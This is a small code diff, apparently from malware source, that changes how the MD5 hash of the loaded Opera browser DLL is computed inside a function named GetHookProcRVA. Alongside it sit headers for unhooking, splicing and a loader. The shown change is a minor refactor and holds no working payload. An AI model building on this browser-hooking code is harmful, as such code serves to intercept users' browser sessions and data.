@@ -12,6 +12,7 @@
 #include "Unhook.h"
 #include "Splice.h"
 #include "Loader.h"
+#include "md5.h"
 
 #include "Opera.h"
 
@@ -372,7 +373,7 @@ LONG GetHookProcRVA(PCHAR DllName, HMODULE Module)
 	// Получаем полный путь к загруженной opera.dll и считаем её MD5-хеш
 
 	// Считаем хеш от файла
-	char *Hash = CalcFileMD5Hash(DllName);
+	PCHAR Hash = CalcFileMD5HashAsBlob(DllName);
 	if (Hash)
 	{
 		for (int i = 0; i < OperaVerCount; i++)
